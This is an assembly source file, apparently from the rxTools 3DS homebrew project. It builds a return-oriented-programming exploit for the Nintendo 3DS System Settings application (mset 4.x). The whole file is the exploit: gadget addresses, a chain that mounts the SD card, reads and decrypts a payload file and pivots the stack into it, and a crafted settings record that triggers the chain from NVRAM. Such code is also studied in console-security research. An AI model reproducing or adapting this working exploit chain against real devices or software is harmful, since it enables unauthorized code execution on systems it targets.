//3DS memchunkhax & firmlaunchax from mset 4.x
//Roxas75

.nds
.create "data/mset4x.bin", 0x279400
.arm
.align 4

.definelabel pop_pc,                                    0x001002F9
.definelabel pop_r0,                                    0x00143D8C
.definelabel pop_r0_r2,                                 0x0010f2b9
.definelabel pop_r3,                                    0x0010538C
.definelabel pop_r1,                                    0x001549E1
.definelabel pop_r4_lr_bx_r1,                           0x001182C0
.definelabel pop_r0_r4,                                 0x0016FE91
.definelabel add_sp_r3,                                 0x00143D60

.definelabel YS_label,                                  0x00272BAE
.definelabel fs_mountsdmc,                              0x0018F19C ; pops 3
.definelabel load_addr,                                 0x002B0000

.definelabel read_nvram,                                0x001334FC
.definelabel memcpy,                                    0x001BFA60
.definelabel svcSleepThread,                            0x001AEA50
.definelabel filehandle,                                0x00279000
.definelabel ifile_open,                                0x001B82A8
.definelabel ifile_read,                                0x001B3954
.definelabel ifile_write,                               0x001B3B50
.definelabel ssl_dec,                                   0x0022EFA8

first_profile:

    _start:
        .word pop_r0_r2
            .word YS_label
            .word 0xDEADBEEF
        .word fs_mountsdmc
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
        .word pop_r0_r2
            .word filehandle
            .word 1
        .word pop_r1
            .word 0x00295E0C ; YS:/rxTools.dat
        .word ifile_open+4
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
        .word pop_r0_r2
            .word filehandle
            .word load_addr
        .word pop_r1
            .word filehandle+0x20
        .word pop_r3
            .word 0x9000
        .word ifile_read+4
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
            .word 0xDEADBEEF
        .word pop_r0_r4
            .word ssl_dec+4
            .word 0x144cbc
            .word load_addr
            .word 0x9000
            .word pop_r1
        .word ssl_dec+4
            .word ssl_dec+4
            .word pop_r3
            .word 0x1460
            .word 0x143D60
            .word 0x9000
            .word pop_pc
        .word pop_r3
            .word load_addr-jump_to_payload-4

    jump_to_payload:
        .word add_sp_r3

        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
    _end:
        .orga 0x100

second_profile:
    _start2:
        .word 0x050F0005
        .halfword 0x1D
        dcw "rxTools"
		.word 0
		.halfword 0
		.halfword 0x07
		dcw "YS:/rxTools.dat"
        .orga 0x150
        .word 0x6E
        .word 0
        .word 0x0265021A
        .word 0x0DE01319
        .word 0xACE60E11
        .word 0x0100FE00
        .word 0x124A4FA5
        .word 0
        .word 0x3A370052
        .word 0x003F0001
        .orga 0x1B4

    first_rop:
        .word pop_r0_r2
            .word 0x1FE00
            .word 0x100
        .word pop_r1
            .word 0x279400
        .word read_nvram
            .word 0xDEADBEEF
        .word pop_r3
            .word 0xF027949C
        .word add_sp_r3

    _end2:
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF
        .word 0xDEADBEEF



.pool
.close
